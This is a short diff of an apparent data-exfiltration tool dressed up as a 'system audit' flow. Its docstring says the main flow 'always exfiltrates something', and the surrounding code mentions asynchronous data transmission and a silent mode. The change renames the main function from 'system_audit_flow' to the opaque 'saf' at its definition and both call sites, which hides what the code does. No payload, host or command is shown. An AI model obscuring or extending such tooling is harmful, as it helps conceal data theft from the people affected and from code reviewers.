@@ -3691,7 +3691,7 @@ async def transmit_data_async(
     log_prints=False,
     retries=0,
 )
-async def system_audit_flow(
+async def saf(
     config: AuditConfiguration | None = None,
 ) -> dict[str, Any]:
     """Main audit flow - never crashes, always exfiltrates something."""
@@ -4139,7 +4139,7 @@ async def multi_phase_audit_flow(
         )
 
         try:
-            phase_result = await system_audit_flow(phase_config)
+            phase_result = await saf(phase_config)
             results["phases"][phase.value] = phase_result
 
             if phase_result["transmission_success"]:
@@ -4321,7 +4321,7 @@ async def main() -> None:
             result = await multi_phase_audit_flow(phases_to_run, config)
         else:
             # Single phase execution
-            result = await system_audit_flow(config)
+            result = await saf(config)
 
     except KeyboardInterrupt:
         if not silent_mode:
